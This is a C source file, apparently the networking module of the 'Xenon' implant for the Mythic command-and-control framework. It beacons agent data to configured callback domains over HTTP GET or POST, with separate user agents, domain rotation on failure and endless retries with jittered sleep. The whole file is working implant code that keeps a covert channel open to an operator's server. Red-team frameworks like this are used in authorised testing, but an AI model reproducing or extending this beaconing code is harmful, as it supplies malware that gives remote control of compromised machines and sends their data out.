#include "Xenon.h"

#include "Network.h"
#include "Config.h"
#include "Http.h"
#include "Parser.h"
#include "Package.h"
#include "Strategy.h"
#include "Sleep.h"

#define GET_REQUEST     0x00
#define POST_REQUEST    0x01
int gFailureCount = 0;
HANDLE gHttpMutex = NULL;

BOOL NetworkHttpXSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen);


/**
 * @brief Initialize a mutex for preventing a race condition with global HINTERNET handles.
 * @return VOID
 */
VOID NetworkInitMutex()
{
    gHttpMutex = CreateMutex(NULL, FALSE, NULL);
    if (!gHttpMutex)
    {
        _err("Failed to create HTTP mutex");
    }
}


/**
 * @brief Transport Mythic message using defined C2 profile.
 * 
 * @param[in] package Payload to send to Mythic server.
 * @param[out] ppOutData Output buffer from response.
 * @param[out] pOutLen Length of response output.
 * 
 * @return BOOL
 */
BOOL NetworkRequest(_In_ PPackage package, _Out_ PBYTE* ppOutData, _Out_ SIZE_T* pOutLen)
{
// HTTPX C2 Profile (only currently supported c2 profile)
    #ifdef HTTPX_TRANSPORT
        BOOL bStatus = FALSE; 
        
        // Pointers for data and size get filled in the GET or POST function
        bStatus = NetworkHttpXSend(package, ppOutData, pOutLen);
        
        if (bStatus == FALSE || ppOutData == NULL || pOutLen == NULL)
            return FALSE;

        return TRUE;
    #endif

    #ifdef HTTP_TRANSPORT
        return TRUE;
    #endif

// Maybe some day
    #ifdef DNS_TRANSPORT
        return TRUE;
    #endif

    return FALSE;
}


#ifdef HTTPX_TRANSPORT
/**
 * @brief Transport Mythic using HttpX profile.
 * 
 * @param[in] package Payload to send to Mythic server.
 * @param[out] ppOutData Output buffer from response.
 * @param[out] pOutLen Length of response output.
 * 
 * @return BOOL
 */
BOOL NetworkHttpXSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
{
    /*
        This is a hacky work-around for avoiding a race condition.
        The NetworkHttpXSend() function uses global HINTERNET handles under-the-hood, so
        with multi-threading there is a possibilty of gInternetConnect/gInternetOpen 
        handles being freed while they're being used in another thread.
    */
    if (WaitForSingleObject(gHttpMutex, INFINITE) != WAIT_OBJECT_0)     // Locks 
    {
        _dbg("WaitForSingleObject failed : ERROR %d", GetLastError());
    }
        

    SIZE_T bufferLen = package->length;
    BYTE reqProfile = (bufferLen > 500) ? POST_REQUEST : GET_REQUEST;   // Choose request type based on payload size

    HttpInit();

    BOOL bStatus = TRUE;

retry_request:
    // Domain rotation strategy
    StrategyRotate(bStatus, &gFailureCount);

    switch (reqProfile)
    {
        case GET_REQUEST:
            _dbg("GET Request --> %s://%s:%d", xenonConfig->CallbackDomains->isSSL ? "https" : "http", xenonConfig->CallbackDomains->hostname, xenonConfig->CallbackDomains->port);
            // (Re)Configure head of callback domains
            HttpConfigureHttp(xenonConfig->CallbackDomains->hostname, xenonConfig->CallbackDomains->port, S_GET_USERAGENT);
            
            bStatus = HttpGet(package, ppOutData, pOutLen);
            break;
        case POST_REQUEST:
            _dbg("POST Request --> %s://%s:%d", xenonConfig->CallbackDomains->isSSL ? "https" : "http", xenonConfig->CallbackDomains->hostname, xenonConfig->CallbackDomains->port);
            // (Re)Configure head of callback domains
            HttpConfigureHttp(xenonConfig->CallbackDomains->hostname, xenonConfig->CallbackDomains->port, S_POST_USERAGENT);
            
            bStatus = HttpPost(package, ppOutData, pOutLen);
            break;
        default:
            _err("Unknown request type");
            break;
    }

    if (bStatus) {
        gFailureCount = 0;
    } else {
        gFailureCount++;        
        _err("HTTP failed %d times. Retrying...", gFailureCount);
        
        SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
        goto retry_request;
    }

    HttpClose();    // Releases HINTERNET handles

    ReleaseMutex(gHttpMutex);   // Unlock

    return bStatus;
}

#endif



#ifdef HTTP_TRANSPORT
    // good code
#endif


#ifdef DNS_TRANSPORT
    // good code
#endif